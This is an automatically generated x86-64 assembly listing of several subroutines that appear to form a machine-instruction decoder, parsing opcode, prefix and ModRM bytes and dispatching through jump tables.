mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp [ rbx + 0x134 ] 0x0
mov [ rbx + 0x13b ] r8b
cmovne eax ecx
mov [ rbx + 0x13c ] al
xor eax eax
jmp r-xdata
sub_100022f6
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or ecx [ rbx ]
or [ rbx ] cl
or [ rdx ] ecx
int3
sub_10002390
sub rsp 0x28
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x40 ] rsi
xor sil sil
cmp [ rcx + 0x130 ] sil
mov rbx rcx
je r-xdata
movzx eax [ rcx + 0x8 ]
cmp al [ rcx + 0x9 ]
je r-xdata
mov eax 0xffffffff
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
cmp [ rbx + 0x130 ] 0x0
jne r-xdata
movzx eax [ rbx + 0x8 ]
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x48 ] rdi
mov dl [ rax + rbx + 0x143 ]
mov [ rsp + 0x20 ] r12
xor r12d r12d
cmp dl 0x90
jne r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
cmp dl 0xf
jne r-xdata
cmp [ rbx + 0xac ] 0x40
jne r-xdata
mov edi 0x2c
mov rcx rbx
mov edi r12d
call sub_100017d0
cmp [ rbx + 0x130 ] dil
mov dl al
jne r-xdata
cmp [ rbx + 0x136 ] r12b
je r-xdata
test [ rbx + 0x131 ] 0x1
jne r-xdata
cmp [ rdi ] 0x224
jne r-xdata
movsxd rdi [ rdi + 0x1c ]
add eax 0xfffffdd9
cmp eax 0x7
ja r-xdata
mov eax 0xffffffff
jmp r-xdata
movzx eax [ rbx + 0x139 ]
cmp al 0x66
jne r-xdata
lea rdi [ rw-data ]
jmp r-xdata
mov [ rbx + 0x136 ] r12b
lea rdi [ rw-data ]
mov [ rbx + 0x288 ] rdi
mov eax [ rdi ]
mov [ rbx + 0xc8 ] eax
xor eax eax
test sil sil
je r-xdata
mov rax rdi
movzx edi dl
shl rdi 0x5
add rdi [ rbp + rax * 8 + 0x34d70 ]
mov eax [ rdi ]
cmp eax 0x225
jge r-xdata
cdqe
mov ecx [ rbp + rax * 4 + 0x26cc ]
add rcx rbp
jmp rcx
mov rdi [ rsp + 0x48 ]
mov rbp [ rsp + 0x38 ]
mov r12 [ rsp + 0x20 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x28
retn
cmp al 0xf2
jne r-xdata
mov rax [ rw-data ]
movzx ecx dl
shl rcx 0x5
cmp [ rcx + rax ] 0x224
je r-xdata
mov rcx rbx
call sub_100017d0
cmp [ rbx + 0x130 ] r12b
je r-xdata
mov rcx rbx
mov sil 0x1
call sub_10001850
mov dl al
shr dl 0x3
and dl 0x7
jmp r-xdata
mov rcx rbx
mov sil 0x1
call sub_10001850
and al 0xc0
cmp al 0xc0
sete dl
jmp r-xdata
mov rcx rbx
call sub_100017d0
xor sil sil
cmp [ rbx + 0x130 ] sil
mov dl al
jne r-xdata
mov rcx rbx
call sub_100017d0
xor sil sil
cmp [ rbx + 0x130 ] sil
mov dl al
jne r-xdata
movzx eax [ rbx + 0x13b ]
cmp al 0x40
jne r-xdata
movzx eax [ rbx + 0x13c ]
cmp al 0x40
jne r-xdata
movzx eax [ rbx + 0xac ]
cmp al 0x40
jne r-xdata
movzx eax [ rbx + 0xb8 ]
cmp al 0x1
jne r-xdata
cmp al 0xf3
jne r-xdata
mov rax [ rw-data ]
movzx ecx dl
shl rcx 0x5
cmp [ rcx + rax ] 0x224
je r-xdata
movsxd rax edi
lea rbp [ __dos_header ]
movzx edi dl
shl rdi 0x5
add rdi [ rbp + rax * 8 + 0x34d70 ]
mov eax [ rdi ]
cmp eax 0x225
jl r-xdata
mov edi 0x6d
mov [ rbx + 0x133 ] r12b
jmp r-xdata
and dl 0x7
jmp r-xdata
add dl 0x40
jmp r-xdata
cmp al 0x20
sete dl
jmp r-xdata
mov dl 0x2
jmp r-xdata
cmp al 0x20
sete dl
jmp r-xdata
mov dl 0x2
jmp r-xdata
cmp al 0x20
sete dl
jmp r-xdata
mov dl 0x2
jmp r-xdata
movzx edx dl
test al al
cmove edx r12d
mov dl al
jmp r-xdata
mov rax [ rw-data ]
movzx ecx dl
shl rcx 0x5
cmp [ rcx + rax ] 0x224
je r-xdata
mov edi 0x73
mov [ rbx + 0x138 ] r12b
jmp r-xdata
mov edi 0x74
mov [ rbx + 0x137 ] r12b
mov [ rbx + 0x136 ] r12b
jmp r-xdata
sub_100026f0
mov eax edx
sub eax 0x1
je r-xdata
mov edx 0x10
mov eax 0x20
cmp [ rcx + 0x13b ] dl
cmove eax edx
retn
sub eax 0x1
je r-xdata
movzx eax [ rcx + 0x13b ]
retn
sub eax 0x1
je r-xdata
xor eax eax
cmp [ rcx + 0x13b ] 0x10
setne al
add eax 0x4
retn
sub eax 0x3
je r-xdata
movzx eax [ rcx + 0x13b ]
cmp al 0x10
jne r-xdata
cmp eax 0x1
je r-xdata
movzx eax al
retn
mov eax 0x20
retn
mov edx 0x40
mov eax 0x20
cmp [ rcx + 0xac ] dl
cmove eax edx
retn
mov eax edx
retn
sub_10002770
mov eax [ rcx + 0xc8 ]
mov rdx rcx
mov [ rcx + 0x13d ] 0x0
cmp eax 0x1c
mov [ rcx + 0x13e ] 0x0
je r-xdata
movzx eax [ rcx + 0xd4 ]
cmp al 0x4
jne r-xdata
cmp eax 0xf2
je r-xdata
cmp al 0x5
jne r-xdata
mov [ rcx + 0xd4 ] 0x10
mov [ rcx + 0x13d ] 0x1
mov [ rcx + 0x13e ] 0x0
jmp r-xdata
test eax eax
jne r-xdata
mov [ rcx + 0x13d ] 0x0
mov [ rcx + 0x13e ] 0x1
mov [ rcx + 0xd4 ] 0x20
mov [ rcx + 0x13d ] 0x1
mov [ rcx + 0x13e ] 0x0
jmp r-xdata
cmp [ rdx + 0xc8 ] 0x200
jne r-xdata
movzx eax [ rcx + 0x8 ]
movzx ecx [ rax + rcx + 0x143 ]
mov rax [ rw-data ]
shl rcx 0x5
mov ecx [ rcx + rax ]
mov [ rdx + 0xc8 ] ecx
jmp r-xdata
xor eax eax
retn
cmp [ rdx + 0xac ] 0x40
je r-xdata
mov [ rdx + 0x130 ] 0x1
mov eax 0xffffffff
retn
sub_10002830
mov eax edx
mov r9 rcx
sub eax 0x1
je r-xdata
mov eax 0x10
cmp [ rcx + 0x13b ] al
sub eax 0x1
je r-xdata
xor eax eax
retn
mov eax edx
lea rdx [ __dos_header ]
movzx eax [ rdx + rax + 0x2920 ]
mov ecx [ rdx + rax * 4 + 0x290c ]
add rcx rdx
jmp rcx
movzx edx [ rcx + 0x13b ]
jmp r-xdata
sub eax 0x1
je r-xdata
movzx eax r8b
add eax 0x35
retn
movzx eax r8b
add eax 0x25
retn
movzx eax r8b
add eax 0x15
retn
cmp [ r9 + 0xac ] 0x40
jne r-xdata
add edx 0xfffffffc
cmp edx 0x3c
ja r-xdata
xor edx edx
cmp [ rcx + 0x13b ] 0x10
setne dl
add edx 0x4
jmp r-xdata
sub eax 0x3
je r-xdata
movzx eax r8b
cmp [ r9 + 0x131 ] 0x0
je r-xdata
movzx eax [ rcx + 0x13b ]
cmp al 0x10
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp r8b 0x4
movzx eax r8b
jb r-xdata
movzx edx al
jmp r-xdata
mov edx 0x20
jmp r-xdata
mov eax 0x40
cmp [ rcx + 0xac ] al
jmp r-xdata
add eax 0x1
retn
add eax 0x5
retn
mov edx 0x20
cmove edx eax
sub_10002925
add al 0x4
add al 0x4
add al 0x4
add al 0x0
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10002960
lea eax [ rdx - 0x26 ]
cmp eax 0x7
ja r-xdata
sub edx 0x1e
mov r8b [ rcx + 0x131 ]
lea eax [ rdx - 0x26 ]
and r8d 0x1
shl r8d 0x3
mov edx r8d
or edx eax
jmp r-xdata
cmp [ rcx + 0xac ] 0x20
je r-xdata
lea eax [ rdx + 0x15 ]
retn
movzx eax [ rcx + 0x13b ]
cmp al 0x10
jne r-xdata
lea eax [ rdx + 0x25 ]
retn
cmp al 0x20
jne r-xdata
lea eax [ rdx + 0x35 ]
retn
test [ rcx + 0x131 ] 0x8
jne r-xdata
cmp [ rcx + 0x13a ] 0x0
je r-xdata
sub_100029c0
sub rsp 0x28
mov [ rsp + 0x40 ] rbx
mov eax edx
mov [ rsp + 0x48 ] rdi
sub eax 0x1
mov rdi r8
mov rbx rcx
je r-xdata
mov eax 0x10
mov edx 0x20
cmp [ rcx + 0x13b ] al
cmove edx eax
sub eax 0x1
je r-xdata
movzx eax [ rcx + 0x8 ]
cmp al [ rcx + 0x9 ]
je r-xdata
cmp dl 0x10
je r-xdata
movzx edx [ rcx + 0x13b ]
jmp r-xdata
sub eax 0x1
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
mov [ rdi + 0x8 ] al
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
call sub_100018f0
mov [ rdi + 0x8 ] ax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
cmp dl 0x20
je r-xdata
cmp dl 0x8
mov [ r8 + 0x4 ] dl
mov [ r8 ] 0x8f
je r-xdata
xor edx edx
cmp [ rcx + 0x13b ] 0x10
setne dl
add edx 0x4
jmp r-xdata
sub eax 0x3
je r-xdata
xor al al
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
mov [ rdi + 0x8 ] al
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
call sub_100019f0
mov [ rdi + 0x8 ] eax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
cmp dl 0x40
jne r-xdata
movzx eax [ rcx + 0x13b ]
cmp al 0x10
jne r-xdata
sub eax 0x1
jne r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
mov [ rdi + 0x8 ] al
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
call sub_10001bd0
mov [ rdi + 0x8 ] rax
mov rdi [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
add rsp 0x28
retn
movzx edx al
jmp r-xdata
mov edx 0x20
jmp r-xdata
mov eax 0x40
mov edx 0x20
cmp [ rcx + 0xac ] al
cmove edx eax
jmp r-xdata
sub_10002b50
sub rsp 0x68
movzx eax [ rcx + 0x8 ]
mov [ rsp + 0x60 ] rbx
mov [ rsp + 0x58 ] rbp
cmp al [ rcx + 0x9 ]
mov [ rsp + 0x48 ] rdi
mov [ rsp + 0x30 ] r14
movzx r14d r9b
mov ebp r8d
mov rdi rdx
mov rbx rcx
je r-xdata
cmp [ rcx + 0x30 ] 0x0
jne r-xdata
add al 0x1
movzx eax al
mov [ rcx + 0x8 ] al
movzx eax [ rax + rcx + 0x143 ]
movzx ecx [ rcx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ rbx + 0x8 ]
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x40 ] r12
movzx ecx [ rax + rbx + 0x143 ]
mov [ rsp + 0x38 ] r13
movzx r13d [ rbx + 0x131 ]
movzx eax cl
movzx r8d r13b
movzx r12d cl
shr cl 0x3
and r8b 0x1
and r13b 0x4
and cl 0x7
and al 0x7
shl r8b 0x3
add r13b r13b
or r8b al
mov eax ebp
or r13b cl
mov ecx 0x40
shr r12b 0x6
xor esi esi
sub eax 0x1
mov [ rsp + 0x28 ] r15
lea r15d [ rcx - 0x30 ]
je r-xdata
cmp [ rbx + 0x13b ] r15b
mov ebp 0x20
cmove ebp r15d
sub eax 0x1
je r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov [ rdi ] 0x8d
movzx eax [ rbx + 0x13c ]
cmp al cl
jne r-xdata
cmp r14b 0x1
mov [ rdi ] 0x8c
jne r-xdata
movzx ebp [ rbx + 0x13b ]
jmp r-xdata
sub eax 0x1
je r-xdata
cmp al 0x20
jne r-xdata
movzx eax r8b
add eax 0x35
cmp r12b 0x1
mov [ rdi + 0x10 ] eax
jne r-xdata
movzx ecx [ rbx + 0x131 ]
and r8b 0x7
movzx eax r14b
and cl 0x1
shl cl 0x3
or cl r8b
sub eax 0x2
je r-xdata
movzx edx bpl
mov rcx rbx
call sub_10002830
mov [ rdi + 0x10 ] eax
jmp r-xdata
cmp r12b 0x3
mov [ rdi + 0x4 ] bpl
jne r-xdata
cmp [ rbx + 0x13b ] r15b
mov ebp esi
setne bpl
add ebp 0x4
jmp r-xdata
sub eax 0x3
je r-xdata
movzx eax r8b
cmp eax 0x7
ja r-xdata
movzx eax r8b
add eax 0x25
cmp r12b 0x1
mov [ rdi + 0x10 ] eax
jne r-xdata
cmp r12b 0x2
jne r-xdata
mov [ rdi + 0x18 ] 0x8
jmp r-xdata
mov al cl
and eax 0x7
add eax 0x6b
mov [ rdi + 0x10 ] eax
jmp r-xdata
sub eax 0x1
je r-xdata
mov al [ rdi + 0x18 ]
mov r14 [ rsp + 0x30 ]
mov r12 [ rsp + 0x40 ]
cmp al 0x8
mov rbp [ rsp + 0x58 ]
je r-xdata
movzx eax [ rbx + 0x13b ]
cmp al r15b
jne r-xdata
sub eax 0x1
jne r-xdata
test r12b r12b
jne r-xdata
lea rdx [ __dos_header ]
mov ecx [ rdx + rax * 4 + 0x3244 ]
add rcx rdx
jmp rcx
cmp r12b 0x2
jne r-xdata
mov [ rdi + 0x18 ] 0x8
jmp r-xdata
test r12b r12b
jne r-xdata
mov [ rdi + 0x18 ] 0x20
jmp r-xdata
and r8b 0x7
cmp r8b 0x4
jne r-xdata
movzx eax cl
add eax 0x4b
mov [ rdi + 0x10 ] eax
jmp r-xdata
sub eax 0x1
je r-xdata
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
cmp al r15b
je r-xdata
movzx ebp al
jmp r-xdata
mov ebp 0x20
jmp r-xdata
cmp [ rbx + 0xac ] cl
mov ebp 0x20
cmove ebp ecx
jmp r-xdata
cmp r12b 0x1
jne r-xdata
cmp r8b 0x6
jne r-xdata
mov [ rdi + 0x10 ] 0x18
mov [ rdi + 0x14 ] 0x1b
jmp r-xdata
mov [ rdi + 0x10 ] 0x18
mov [ rdi + 0x14 ] 0x1c
jmp r-xdata
mov [ rdi + 0x10 ] 0x1a
mov [ rdi + 0x14 ] 0x1b
jmp r-xdata
mov [ rdi + 0x10 ] 0x1a
mov [ rdi + 0x14 ] 0x1c
jmp r-xdata
mov [ rdi + 0x10 ] 0x1b
jmp r-xdata
mov [ rdi + 0x10 ] 0x1c
jmp r-xdata
mov [ rdi + 0x10 ] 0x1a
jmp r-xdata
mov [ rdi + 0x10 ] 0x18
test r12b r12b
jne r-xdata
mov [ rdi + 0x18 ] 0x20
jmp r-xdata
and r8b 0x7
cmp r8b 0x4
jne r-xdata
mov [ rdi + 0x18 ] sil
movzx eax r8b
and al 0x7
cmp al 0x5
jne r-xdata
movzx eax [ rbx + 0x8 ]
cmp al [ rbx + 0x9 ]
je r-xdata
movzx eax cl
add eax 0x5b
mov [ rdi + 0x10 ] eax
jmp r-xdata
sub eax 0x1
je r-xdata
cmp [ rbx + 0x30 ] sil
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_100018f0
mov [ rdi + 0x8 ] ax
jmp r-xdata
cmp al 0x20
je r-xdata
cmp r12b 0x2
jne r-xdata
mov [ rdi + 0x18 ] 0x8
jmp r-xdata
mov [ rdi + 0x18 ] r15b
mov [ rdi + 0x10 ] esi
jmp r-xdata
mov [ rdi + 0x18 ] sil
cmp r8b 0x5
jne r-xdata
mov rcx rbx
call sub_100017d0
movzx eax [ rbx + 0x8 ]
movzx ecx [ rax + rbx + 0x143 ]
mov eax 0x1
shr ecx 0x6
shl al cl
and al 0xfe
mov [ rdi + 0x19 ] al
movzx eax [ rbx + 0x8 ]
mov cl [ rax + rbx + 0x143 ]
mov al [ rbx + 0x131 ]
shr ecx 0x3
and eax 0x2
and ecx 0x7
shl eax 0x2
or ecx eax
add ecx 0x25
mov [ rdi + 0x14 ] ecx
movzx eax [ rbx + 0x8 ]
mov cl [ rax + rbx + 0x143 ]
mov al [ rbx + 0x131 ]
and ecx 0x7
and eax 0x1
shl eax 0x3
or ecx eax
add ecx 0x25
cmp [ rdi + 0x14 ] 0x29
mov [ rdi + 0x10 ] ecx
jne r-xdata
mov [ rdi + 0x10 ] 0x8b
mov [ rdi + 0x18 ] 0x20
jmp r-xdata
cmp [ rbx + 0x30 ] sil
jne r-xdata
movzx ecx [ rbx + 0x18 ]
add al 0x1
movzx eax al
mov [ rbx + 0x8 ] al
movzx eax [ rax + rbx + 0x143 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov al cl
and eax 0x7
add eax 0x45
mov [ rdi + 0x10 ] eax
jmp r-xdata
cmp eax 0x1
je r-xdata
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
xor al al
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
mov [ rdi + 0x8 ] al
mov r10 [ rsp + 0x90 ]
mov rdi [ rsp + 0x48 ]
test r10 r10
je r-xdata
mov rcx rbx
call sub_100019f0
mov [ rdi + 0x8 ] eax
jmp r-xdata
cmp al 0x40
jne r-xdata
mov [ rdi + 0x18 ] r15b
mov [ rdi + 0x10 ] esi
mov [ rdi + 0x18 ] 0x20
jmp r-xdata
cmp ecx 0x2a
jne r-xdata
mov [ rdi + 0x14 ] esi
mov [ rdi + 0x19 ] sil
mov [ rbx + 0x130 ] 0x1
mov [ rbx + 0x30 ] 0x1
mov rcx rbx
call [ rbx ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ rbx + 0x8 ]
movzx ecx [ rax + rbx + 0x143 ]
mov eax 0x1
shr ecx 0x6
shl al cl
and al 0xfe
mov [ rdi + 0x19 ] al
movzx eax [ rbx + 0x8 ]
mov cl [ rax + rbx + 0x143 ]
mov al [ rbx + 0x131 ]
shr ecx 0x3
and eax 0x2
and ecx 0x7
shl eax 0x2
or ecx eax
add ecx 0x35
mov [ rdi + 0x14 ] ecx
movzx eax [ rbx + 0x8 ]
mov cl [ rax + rbx + 0x143 ]
mov al [ rbx + 0x131 ]
and ecx 0x7
and eax 0x1
shl eax 0x3
or ecx eax
add ecx 0x35
cmp [ rdi + 0x14 ] 0x39
mov [ rdi + 0x10 ] ecx
jne r-xdata
movzx eax cl
add eax 0x7b
mov [ rdi + 0x10 ] eax
jmp r-xdata
mov eax esi
mov [ rdi + 0x10 ] esi
jmp r-xdata
mov r15 [ rsp + 0x28 ]
mov r13 [ rsp + 0x38 ]
mov rsi [ rsp + 0x50 ]
mov rbx [ rsp + 0x60 ]
add rsp 0x68
retn
movzx eax [ rsp + 0x98 ]
mov [ r10 ] 0x8c
mov ecx eax
sub ecx 0x1
je r-xdata
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
mov rcx rbx
call sub_10001bd0
mov [ rdi + 0x8 ] rax
jmp r-xdata
test r12b r12b
jne r-xdata
cmp ecx 0x3a
mov eax ecx
je r-xdata
mov [ rdi + 0x14 ] esi
mov [ rdi + 0x19 ] sil
add [ rbx + 0x9 ] 0x1
movzx ecx [ rbx + 0x9 ]
mov [ rbx + 0x8 ] cl
mov [ rcx + rbx + 0x143 ] al
movzx ecx [ rbx + 0x18 ]
mov [ rcx + rbx + 0x243 ] al
add [ rbx + 0x18 ] 0x1
jmp r-xdata
cmp [ rbx + 0x13b ] r15b
mov eax 0x20
cmove eax r15d
sub ecx 0x1
je r-xdata
cmp r12b 0x1
jne r-xdata
mov [ rdi + 0x10 ] esi
test r12b r12b
jne r-xdata
cmp eax 0x42
jne r-xdata
movzx eax cl
sub eax 0x2
je r-xdata
movzx edx al
movzx r8d r13b
mov rcx rbx
call sub_10002830
mov [ r10 + 0x10 ] eax
jmp r-xdata
movzx eax [ rbx + 0x13b ]
jmp r-xdata
sub ecx 0x1
je r-xdata
mov [ rdi + 0x18 ] 0x20
jmp r-xdata
mov [ rdi + 0x18 ] 0x8
jmp r-xdata
cmp r12b 0x1
jne r-xdata
mov [ rdi + 0x10 ] esi
mov sil r13b
and esi 0x7
add esi 0x6b
sub eax 0x1
je r-xdata
movzx ecx [ rsp + 0xa0 ]
mov [ r10 + 0x4 ] al
cmp cl 0x1
jne r-xdata
cmp [ rbx + 0x13b ] r15b
mov eax esi
setne al
add eax 0x4
jmp r-xdata
sub ecx 0x3
je r-xdata
mov [ rdi + 0x18 ] 0x20
jmp r-xdata
mov [ rdi + 0x18 ] 0x8
jmp r-xdata
movzx esi r13b
add esi 0x4b
jmp r-xdata
sub eax 0x1
je r-xdata
movzx eax [ rbx + 0x13b ]
cmp al r15b
jne r-xdata
sub ecx 0x1
jne r-xdata
mov [ r10 + 0x10 ] esi
movzx esi r13b
add esi 0x5b
jmp r-xdata
sub eax 0x1
je r-xdata
movzx eax al
jmp r-xdata
mov eax 0x20
jmp r-xdata
cmp [ rbx + 0xac ] 0x40
mov eax 0x20
mov ecx 0x40
cmove eax ecx
jmp r-xdata
mov sil r13b
and esi 0x7
add esi 0x45
jmp r-xdata
cmp eax 0x1
jne r-xdata
movzx esi r13b
add esi 0x7b
jmp r-xdata
sub_10003270
sub rsp 0x28
mov al [ rcx + 0x13c ]
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rsi
cmp al 0x10
mov [ rsp + 0x48 ] rdi
mov rsi r8
mov ebx edx
mov rdi rcx
je r-xdata
mov [ r8 + 0x18 ] 0x10
call sub_100018f0
mov [ rsi + 0x8 ] ax
cmp al 0x20
je r-xdata
mov eax 0x10
cmp [ rdi + 0x13b ] al
sub eax 0x1
je r-xdata
mov [ r8 + 0x18 ] 0x20
call sub_100019f0
mov [ rsi + 0x8 ] eax
jmp r-xdata
cmp al 0x40
jne r-xdata
movzx ebx [ rdi + 0x13b ]
jmp r-xdata
sub eax 0x1
je r-xdata
mov eax ebx
mov [ rsi ] 0x8d
sub eax 0x1
je r-xdata
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x28
retn
mov [ r8 + 0x18 ] al
call sub_10001bd0
mov [ rsi + 0x8 ] rax
jmp r-xdata
mov [ rsi + 0x4 ] bl
xor ebx ebx
cmp [ rdi + 0x13b ] 0x10
setne bl
add ebx 0x4
jmp r-xdata
sub eax 0x3
je r-xdata
movzx eax [ rdi + 0x13b ]
cmp al 0x10
jne r-xdata
cmp eax 0x1
jne r-xdata
movzx ebx al
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax 0x40
cmp [ rdi + 0xac ] al
jmp r-xdata
mov ebx 0x20
cmove ebx eax
sub_10003360
mov rax rsp
sub rsp 0x58
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov [ rax - 0x8 ] r12
mov [ rax - 0x10 ] r13
mov [ rax - 0x18 ] r14
mov rax [ rcx + 0x288 ]
mov rdi rcx
mov edx [ rax + 0x4 ]
mov esi [ rax + 0xc ]
mov r14d [ rax + 0x14 ]
mov r12d [ rax + 0x8 ]
mov ebp [ rax + 0x10 ]
mov r13d [ rax + 0x18 ]
lea eax [ rdx - 0x1 ]
lea rbx [ rcx + 0xd0 ]
cmp eax 0x50
ja r-xdata
xor eax eax
mov [ rbx + 0x40 ] eax
mov [ rbx + 0x20 ] eax
mov [ rbx ] eax
lea r8 [ __dos_header ]
cdqe
movzx eax [ r8 + rax + 0x3cf4 ]
mov ecx [ r8 + rax * 4 + 0x3c88 ]
add rcx r8
jmp rcx
cmp [ rdi + 0x13b ] 0x10
jne r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
jne r-xdata
cmp esi 0x4
jne r-xdata
cmp esi 0x3
jne r-xdata
cmp esi 0x5
lea eax [ rdx - 0x5 ]
mov [ rbx ] 0x8c
mov [ rbx + 0x10 ] eax
mov [ rbx + 0x4 ] 0x8
je r-xdata
mov rcx rdi
mov [ rbx ] 0x8c
call sub_10002960
cmp esi 0x5
mov [ rbx + 0x10 ] eax
jne r-xdata
movzx r8d [ rdi + 0x131 ]
mov al r8b
and eax 0x1
lea ecx [ rdx + rax * 8 - 0xd ]
cmp ecx 0x5
jl r-xdata
mov [ rbx ] 0x8c
cmp [ rdi + 0x13b ] 0x10
lea eax [ rdx - 0x2e ]
jne r-xdata
cmp [ rdi + 0xac ] 0x40
jne r-xdata
mov r8 rbx
mov edx r12d
mov rcx rdi
call sub_100029c0
mov [ rbx ] 0x90
jmp r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
je r-xdata
mov rcx rdi
call sub_10001850
and al 0xc0
cmp al 0xc0
je r-xdata
cmp esi 0x4b
jne r-xdata
cmp esi 0x4e
jne r-xdata
lea rdx [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x3
lea rdx [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x4
jmp r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x2
mov r9b 0x2
mov r8d r12d
mov rdx rbx
mov rcx rdi
mov [ rsp + 0x28 ] bpl
mov [ rsp + 0x20 ] rax
call sub_10002b50
jmp r-xdata
lea rdx [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x5
jmp r-xdata
lea rax [ rbx + 0x20 ]
mov [ rsp + 0x30 ] 0x6
mov r9b 0x6
mov r8d r12d
mov rdx rbx
mov rcx rdi
